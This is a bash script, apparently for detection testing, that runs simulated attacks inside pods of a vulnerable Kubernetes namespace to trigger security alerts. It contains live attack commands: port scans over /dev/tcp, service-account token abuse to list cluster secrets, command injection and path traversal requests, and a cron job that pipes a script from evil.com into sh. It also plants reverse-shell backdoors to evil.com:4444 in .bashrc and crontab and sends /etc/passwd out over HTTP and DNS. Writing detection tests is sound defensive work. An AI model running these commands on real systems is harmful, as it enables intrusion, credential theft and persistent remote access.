#!/bin/bash

# Script to generate lots of noise and suspicious activity
# Simulates multiple attack techniques to generate alerts
# Updated to prevent system saturation

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"
INTENSITY="${2:-low}"  # low, medium, high

# Set limits based on intensity
case "$INTENSITY" in
    low)
        MAX_SCAN_HOSTS=20
        MAX_PROCESSES=2
        SCAN_DELAY=2
        PROCESS_DELAY=5
        HTTP_DELAY=3
        ;;
    medium)
        MAX_SCAN_HOSTS=50
        MAX_PROCESSES=5
        SCAN_DELAY=1
        PROCESS_DELAY=3
        HTTP_DELAY=2
        ;;
    high)
        MAX_SCAN_HOSTS=100
        MAX_PROCESSES=10
        SCAN_DELAY=0.5
        PROCESS_DELAY=1
        HTTP_DELAY=1
        ;;
    *)
        MAX_SCAN_HOSTS=20
        MAX_PROCESSES=2
        SCAN_DELAY=2
        PROCESS_DELAY=5
        HTTP_DELAY=3
        ;;
esac

echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║          Noise and Suspicious Activity Generator             ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"

# Get pods
PODS=$(kubectl get pods -n "$NAMESPACE" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null || echo "")

if [ -z "$PODS" ]; then
    echo -e "${RED}No pods found${NC}"
    exit 1
fi

FIRST_POD=$(echo $PODS | cut -d' ' -f1)

echo -e "${YELLOW}Intensity: $INTENSITY${NC}"
echo -e "${YELLOW}Target pods: $PODS${NC}\n"

# 1. Controlled network scanning
echo -e "${BLUE}[1] Network Scanning (limited to $MAX_SCAN_HOSTS hosts)${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
for i in \$(seq 1 $MAX_SCAN_HOSTS); do
    ping -c 1 -W 1 10.0.0.\$i > /dev/null 2>&1 &
    sleep $SCAN_DELAY
    # Limit concurrent processes
    if [ \$(jobs -r | wc -l) -gt 10 ]; then
        wait
    fi
done
wait
" 2>/dev/null &
SCAN_PID=$!
echo -e "${GREEN}✓ Network scanning started (PID: $SCAN_PID)${NC}"
sleep 2

# 2. Controlled port scanning
echo -e "\n${BLUE}[2] Port Scanning${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
for port in 22 80 443 3306 5432 6379 8080 8443; do
    for host in kubernetes.default.svc.cluster.local kube-dns.kube-system.svc.cluster.local; do
        timeout 1 bash -c \"echo > /dev/tcp/\$host/\$port\" 2>/dev/null &
        sleep 0.5
        # Limit concurrent processes
        if [ \$(jobs -r | wc -l) -gt 5 ]; then
            wait
        fi
    done
done
wait
" 2>/dev/null &
PORT_SCAN_PID=$!
echo -e "${GREEN}✓ Port scanning started (PID: $PORT_SCAN_PID)${NC}"
sleep 2

# 3. Aggressive Kubernetes API enumeration
echo -e "\n${BLUE}[3] Aggressive Kubernetes API Enumeration${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
KUBE_TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
KUBE_API=\$(echo \$KUBERNETES_SERVICE_HOST:\$KUBERNETES_SERVICE_PORT)
for resource in pods services deployments secrets configmaps nodes namespaces; do
    curl -k -H \"Authorization: Bearer \$KUBE_TOKEN\" https://\$KUBE_API/api/v1/\$resource 2>/dev/null &
done
" 2>/dev/null &
echo -e "${GREEN}✓ API enumeration started${NC}"

# 4. Create limited suspicious processes
echo -e "\n${BLUE}[4] Creating Suspicious Processes (limited to $MAX_PROCESSES per pod)${NC}"
for POD in $PODS; do
    kubectl exec -it "$POD" -n "$NAMESPACE" -- sh -c "
        # Limited simulated processes (with timeout)
        for i in \$(seq 1 $MAX_PROCESSES); do
            timeout 30 sh -c 'while true; do dd if=/dev/urandom of=/dev/null bs=1M count=10 2>/dev/null; sleep 2; done' &
            sleep $PROCESS_DELAY
        done
        
        # Limited suspicious network processes (with timeout)
        timeout 60 sh -c \"while true; do curl -s --max-time 2 http://google.com > /dev/null 2>&1; sleep $HTTP_DELAY; done\" &
    " 2>/dev/null &
    sleep 1
done
echo -e "${GREEN}✓ Suspicious processes created (limited)${NC}"
sleep 2

# 5. Attempt to access secrets
echo -e "\n${BLUE}[5] Attempting to Access Secrets${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
KUBE_TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
KUBE_API=\$(echo \$KUBERNETES_SERVICE_HOST:\$KUBERNETES_SERVICE_PORT)
for ns in default kube-system kube-public; do
    curl -k -H \"Authorization: Bearer \$KUBE_TOKEN\" https://\$KUBE_API/api/v1/namespaces/\$ns/secrets 2>/dev/null &
done
" 2>/dev/null &
echo -e "${GREEN}✓ Secret access attempts started${NC}"

# 6. Generate controlled suspicious HTTP traffic
echo -e "\n${BLUE}[6] Generating Suspicious HTTP Traffic (limited)${NC}"
for POD in $PODS; do
    kubectl exec -it "$POD" -n "$NAMESPACE" -- sh -c "
        # Limited requests with timeout
        for i in \$(seq 1 20); do
            curl -s --max-time 2 'http://vulnerable-web-app:3000/execute' -X POST -d '{\"command\":\"id\"}' 2>/dev/null || true
            sleep $HTTP_DELAY
            curl -s --max-time 2 'http://vulnerable-web-app:3000/file?name=../../../etc/passwd' 2>/dev/null || true
            sleep $HTTP_DELAY
            curl -s --max-time 2 'http://vulnerable-api:5000/env' 2>/dev/null || true
            sleep $HTTP_DELAY
            curl -s --max-time 2 'http://vulnerable-api:5000/ping?host=localhost;cat /etc/passwd' 2>/dev/null || true
            sleep $HTTP_DELAY
        done
    " 2>/dev/null &
    sleep 1
done
echo -e "${GREEN}✓ Suspicious HTTP traffic generated (limited)${NC}"
sleep 2

# 7. Create suspicious files
echo -e "\n${BLUE}[7] Creating Suspicious Files${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Create suspicious scripts
    echo '#!/bin/sh' > /tmp/.cronjob
    echo 'curl http://evil.com/script.sh | sh' >> /tmp/.cronjob
    chmod +x /tmp/.cronjob
    
    # Create suspicious configuration files
    echo 'MALWARE_CONFIG=active' > /tmp/.config
    echo 'C2_SERVER=evil.com' >> /tmp/.config
    
    # Try to create cron jobs
    echo '* * * * * /tmp/.cronjob' | crontab - 2>/dev/null || true
" 2>/dev/null
echo -e "${GREEN}✓ Suspicious files created${NC}"

# 8. Attempt privilege escalation
echo -e "\n${BLUE}[8] Privilege Escalation Attempts${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Try to mount host filesystem
    mkdir -p /host 2>/dev/null
    mount /dev/sda1 /host 2>/dev/null || true
    
    # Try to access /proc
    cat /proc/1/environ 2>/dev/null | head -c 1000
    
    # Try to access /sys
    cat /sys/class/dmi/id/product_name 2>/dev/null || true
" 2>/dev/null &
echo -e "${GREEN}✓ Escalation attempts started${NC}"

# 9. Exfiltrate data
echo -e "\n${BLUE}[9] Simulating Data Exfiltration${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Try to send data to external servers
    DATA=\$(cat /etc/passwd | base64)
    curl -X POST -d \"data=\$DATA\" http://httpbin.org/post 2>/dev/null &
    
    # Try DNS exfiltration
    for line in \$(cat /etc/passwd | head -5); do
        encoded=\$(echo \$line | base64 | tr -d '=')
        dig \$encoded.evil.com 2>/dev/null &
    done
" 2>/dev/null &
echo -e "${GREEN}✓ Exfiltration simulated${NC}"

# 10. Create backdoors
echo -e "\n${BLUE}[10] Creating Backdoors${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Backdoor in .bashrc
    echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' >> /root/.bashrc 2>/dev/null || true
    echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' >> /home/*/.bashrc 2>/dev/null || true
    
    # Backdoor in cron
    (crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/evil.com/4444 0>&1') | crontab - 2>/dev/null || true
" 2>/dev/null
echo -e "${GREEN}✓ Backdoors created${NC}"

# 11. Modify configurations
echo -e "\n${BLUE}[11] Modifying Configurations${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Modify resolv.conf for DNS hijacking
    echo 'nameserver 8.8.8.8' > /etc/resolv.conf 2>/dev/null || true
    
    # Modify hosts file
    echo '127.0.0.1 evil.com' >> /etc/hosts 2>/dev/null || true
" 2>/dev/null
echo -e "${GREEN}✓ Configurations modified${NC}"

# 12. Generate limited suspicious logs
echo -e "\n${BLUE}[12] Generating Suspicious Logs (limited)${NC}"
kubectl exec -it "$FIRST_POD" -n "$NAMESPACE" -- sh -c "
    # Limited log generation with timeout
    timeout 30 sh -c '
        for i in \$(seq 1 30); do
            logger \"Unauthorized access attempt \$i\" 2>/dev/null || true
            sleep 1
            logger \"Failed authentication \$i\" 2>/dev/null || true
            sleep 1
            logger \"Privilege escalation attempt \$i\" 2>/dev/null || true
            sleep 1
            logger \"Data exfiltration detected \$i\" 2>/dev/null || true
            sleep 1
        done
    ' 2>/dev/null || true
" 2>/dev/null &
echo -e "${GREEN}✓ Suspicious logs generated (limited)${NC}"
sleep 2

echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              Noise Generated Successfully                      ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
echo -e "\n${YELLOW}Activities started:${NC}"
echo -e "  ✓ Massive network scanning"
echo -e "  ✓ Port scanning"
echo -e "  ✓ Kubernetes API enumeration"
echo -e "  ✓ Suspicious processes"
echo -e "  ✓ Secret access"
echo -e "  ✓ Suspicious HTTP traffic"
echo -e "  ✓ Suspicious files"
echo -e "  ✓ Privilege escalation"
echo -e "  ✓ Data exfiltration"
echo -e "  ✓ Backdoors"
echo -e "  ✓ Configuration modification"
echo -e "  ✓ Suspicious logs"
echo -e "\n${YELLOW}To stop activities, restart pods:${NC}"
echo -e "${GREEN}kubectl delete pods -n $NAMESPACE --all${NC}"
